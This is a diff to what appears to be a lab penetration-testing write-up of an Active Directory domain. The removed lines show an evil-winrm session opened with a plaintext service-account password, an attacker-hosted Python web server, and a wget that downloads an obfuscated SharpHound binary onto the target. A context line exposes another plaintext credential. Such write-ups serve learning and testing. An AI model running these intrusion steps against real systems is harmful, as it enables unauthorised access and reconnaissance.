@@ -490,45 +490,6 @@ kwarren:!@#darkhav3n123#@!
 # Bloodhound
 Now is a good time to get bloodhound data, to do this ill get a winrm session as `svc_webpool`
 
-```python
-evil-winrm -i web.ext.darkhaven.local -u svc_webpool -p 'D@rkH@v3n128!'     
-                                        
-Evil-WinRM shell v3.9
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\svc_webpool\Documents> 
-```
-
-```python
-python3 -m http.server 8000 
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-Ill host sharphound using a python webserver
-
-```python
-*Evil-WinRM* PS C:\Users\svc_webpool\Documents> wget http://192.168.211.2:8000/SharpHound.exe._obf.exe -o obf_sharphound.exe
-*Evil-WinRM* PS C:\Users\svc_webpool\Documents> dir
-
-
-    Directory: C:\Users\svc_webpool\Documents
-
-
-Mode                 LastWriteTime         Length Name
-----                 -------------         ------ ----
--a----          4/8/2026   6:39 PM         734720 obf_sharphound.exe
-
-
-*Evil-WinRM* PS C:\Users\svc_webpool\Documents> 
-
-```
-I have now transferred it to my machine
-
-```python
-
-```
+Ill use sharphound and upload it via winrm then collect the data
 
 
